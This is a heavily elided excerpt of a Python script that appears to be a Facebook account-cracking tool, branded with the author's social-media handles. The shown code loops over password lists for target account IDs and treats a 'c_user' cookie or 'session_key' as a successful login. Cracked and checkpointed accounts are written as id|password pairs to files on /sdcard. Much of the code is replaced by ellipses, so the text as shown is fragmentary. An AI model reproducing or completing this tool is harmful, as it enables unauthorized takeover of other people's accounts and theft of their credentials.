...
\033[1;93m--------------------------------------------------
  ...
  \033[1;32mF4C3B00K  : MEER KHAN BALOCH 

  \033[1;32mY0UTUB3   : MEER KB

  \033[1;32mV3RS10N   : 10.10

  \033[1;32m0WN3R     : MEER KHAN BALOCH 
...
def auto_file(cookies,access_token):
    ...
    print('\n \033[1;35m /sdcard/MEER KB.txt \033[0;97m\n')
...
def manual_file(cookies,access_token):
    ...
    print('\n \033[1;32mExample: /sdcard/MEER KB.txt \033[0;97m\n')
...
def sids():
    ...
    print('\n\033[1;32m Example: /sdcard/MEER KB.txt\033[0;97m')
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\r\r\033[1;32m [MEER-KB-OK] %s | %s'%(ids,pas))

				open('/sdcard/MEER-KB-OK.txt', 'a').write(ids+'|'+pas+'\n')
				...
				if 'y' in pcp:
					...
					print('\r\r\x1b[38;5;208m [MEER-KB-CP] '+ids+' | '+pas+'\033[1;97m')

					open('/sdcard/MEER-KB-CP.txt', 'a').write(ids+'|'+pas+'\n')
	...
	try:
		...
		for pas in passlist:
			...
			if 'session_key' in q:
				...
				print('\r\r\033[1;32m [MEER KB-OK] '+udx+' | '+pas+'\033[1;97m')

				open('/sdcard/MEER KB-OK.txt', 'a').write(udx+'|'+pas+'\n')
			...
			if 'c_user' in log_cookies:
				...
				if uid in oks:pass
					...
					if 'checkpoint' in str(lo):
						...
						print('\r\r\033[1;34m [MEER KB-TL] '+ids+' | '+pas)

					else:

						print(f'\r\x1b[1;32m [MEER KB-OK] '+ids+' | '+pas)
...
\033[1;32m[-] FACEBOOK  :\033[1;32m MEER KHAN BALOCH 

\033[1;32m[-] OTHERS    :\033[1;32m MEER--KB

\033[1;32m[-] WhatsApp  :\033[1;32m 😶🙈😶  
...
==================================================   """)
  ...
  os.system('xdg-open https://m.me/Meerkb007')
  ...
  try:
    ...
    if id in httpCaht:
      ...
      os.system('xdg-open https://m.me/Meerkb0077')
